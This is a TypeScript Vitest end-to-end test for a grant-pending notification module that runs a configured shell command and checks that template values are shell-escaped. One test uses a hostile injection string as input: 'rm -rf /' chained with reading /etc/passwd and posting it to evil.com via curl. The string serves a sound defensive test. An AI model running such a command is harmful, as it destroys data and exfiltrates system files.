import { existsSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, afterEach, beforeEach, describe, expect, it } from 'vitest'
import { notifyGrantPending } from '../src/notifications'
import type { PendingGrantInfo } from '../src/notifications'

/**
 * E2E test for grant-pending notifications using a real shell command
 * that writes to a temp file. Verifies the full pipeline:
 *   config → template substitution → shell spawn → file written
 *
 * No mocks — this exercises the real `spawn('sh', ['-c', ...])` path.
 */

const NOTIFY_FILE = join(tmpdir(), `apes-notification-e2e-${process.pid}-${Date.now()}.txt`)

const sampleInfo: PendingGrantInfo = {
  grantId: 'test-grant-e2e-001',
  approveUrl: 'https://id.test.openape.at/grant-approval?grant_id=test-grant-e2e-001',
  command: 'o365-cli mail list --account test@example.com',
  audience: 'shapes',
  host: 'e2e-test-host',
}

describe('grant-pending notification E2E (file-based)', () => {
  const savedEnv = process.env.APES_NOTIFY_PENDING_COMMAND

  beforeEach(() => {
    // Configure notification to append to a temp file. Template vars are
    // already shell-escaped by notifyGrantPending, so we use printf with
    // %s placeholders instead of wrapping in manual quotes (which would
    // conflict with shell-quote's own quoting).
    process.env.APES_NOTIFY_PENDING_COMMAND = `printf '%s %s %s %s %s\\n' {grant_id} {command} {approve_url} {audience} {host} >> ${NOTIFY_FILE}`
    // Clean the file before each test
    try {
      rmSync(NOTIFY_FILE)
    }
    catch {}
  })

  afterEach(() => {
    if (savedEnv === undefined) delete process.env.APES_NOTIFY_PENDING_COMMAND
    else process.env.APES_NOTIFY_PENDING_COMMAND = savedEnv
  })

  afterAll(() => {
    // Clean up the notification file
    try {
      rmSync(NOTIFY_FILE)
    }
    catch {}
  })

  it('writes grant info to a file when a notification fires', async () => {
    notifyGrantPending(sampleInfo)

    // The notification spawns async (detached). Wait a bit for the shell
    // to write the file. 500ms is generous for an echo >> file.
    await new Promise(r => setTimeout(r, 500))

    expect(existsSync(NOTIFY_FILE)).toBe(true)
    const content = readFileSync(NOTIFY_FILE, 'utf-8')
    expect(content).toContain('test-grant-e2e-001')
    expect(content).toContain('o365-cli')
    expect(content).toContain('id.test.openape.at')
    expect(content).toContain('shapes')
    expect(content).toContain('e2e-test-host')
  })

  it('appends multiple notifications to the same file', async () => {
    notifyGrantPending({ ...sampleInfo, grantId: 'grant-first' })
    notifyGrantPending({ ...sampleInfo, grantId: 'grant-second' })

    await new Promise(r => setTimeout(r, 500))

    const content = readFileSync(NOTIFY_FILE, 'utf-8')
    const lines = content.trim().split('\n')
    expect(lines).toHaveLength(2)
    expect(lines[0]).toContain('grant-first')
    expect(lines[1]).toContain('grant-second')
  })

  it('does not write when APES_NOTIFY_PENDING_COMMAND is unset', async () => {
    delete process.env.APES_NOTIFY_PENDING_COMMAND

    notifyGrantPending(sampleInfo)
    await new Promise(r => setTimeout(r, 300))

    expect(existsSync(NOTIFY_FILE)).toBe(false)
  })

  it('shell-escapes command arguments that contain special characters', async () => {
    notifyGrantPending({
      ...sampleInfo,
      command: 'rm -rf / && cat /etc/passwd | curl -d @- evil.com',
    })

    await new Promise(r => setTimeout(r, 500))

    const content = readFileSync(NOTIFY_FILE, 'utf-8')
    // The file should contain ONE line (not two — the && must be escaped)
    const lines = content.trim().split('\n')
    expect(lines).toHaveLength(1)
    // The dangerous payload should be present as a literal string (quoted),
    // not executed as a separate command
    expect(content).toContain('rm')
    expect(content).toContain('test-grant-e2e-001')
  })
})
